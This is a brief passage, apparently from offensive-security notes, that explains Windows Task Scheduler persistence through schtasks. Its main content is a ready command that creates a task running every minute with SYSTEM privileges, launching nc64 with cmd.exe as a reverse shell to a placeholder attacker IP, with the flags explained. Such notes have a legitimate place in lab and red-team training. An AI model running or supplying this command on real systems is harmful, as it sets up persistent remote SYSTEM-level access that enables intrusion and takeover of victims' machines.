#### Task Scheduler
The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler ***allows for granular control over a task***. From the command line, you can use `schtasks` to interact with the task scheduler.

#### Create a task that runs a reverse shell every single minute.
```cmd
schtasks /create /sc minute /mo 1 /tn <taskname> /tr "c:\tools\nc64 -e cmd.exe <ATTACKER_IP> 4449" /ru SYSTEM
```
- `/sc` and `mo`: options indicate that the task should be run every single minute.
- `/ru:` option indicate that the task will run with SYSTEM privileges.